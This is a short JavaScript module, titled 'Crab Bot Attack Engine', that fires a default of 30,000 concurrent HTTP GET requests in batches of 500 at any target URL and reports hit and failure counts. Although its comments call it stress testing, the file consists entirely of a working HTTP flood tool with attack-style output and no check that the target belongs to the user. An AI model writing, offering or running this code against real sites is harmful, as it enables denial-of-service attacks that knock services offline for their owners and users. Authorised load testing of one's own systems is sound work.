const axios = require('axios');

/**
 * Crab Bot Attack Engine
 * This engine simulates high-volume traffic for stress testing.
 */
async function startAttack(targetUrl, botCount = 30000) {
    console.log(`\n[!] Starting Crab Bot Attack on: ${targetUrl}`);
    console.log(`[!] Deploying ${botCount} virtual nodes...\n`);

    let successfulRequests = 0;
    let failedRequests = 0;

    // Function to simulate a single bot request
    const sendRequest = async () => {
        try {
            await axios.get(targetUrl, {
                headers: {
                    'User-Agent': 'CrabBot-Security-Scanner/1.0',
                    'Cache-Control': 'no-cache'
                },
                timeout: 5000
            });
            successfulRequests++;
        } catch (error) {
            failedRequests++;
        }
    };

    // We use a batching approach to avoid crashing the local system while maintaining high speed
    const batchSize = 500; 
    const totalBatches = Math.ceil(botCount / batchSize);

    for (let i = 0; i < totalBatches; i++) {
        const batch = [];
        for (let j = 0; j < batchSize && (i * batchSize + j) < botCount; j++) {
            batch.push(sendRequest());
        }
        
        // Execute batch concurrently
        await Promise.allSettled(batch);
        
        process.stdout.write(`\r[+] Progress: ${Math.min((i + 1) * batchSize, botCount)}/${botCount} requests sent...`);
    }

    console.log(`\n\n[✓] Stress Test Completed.`);
    console.log(`[+] Successful hits: ${successfulRequests}`);
    console.log(`[+] Failed/Blocked: ${failedRequests}`);
}

module.exports = { startAttack };
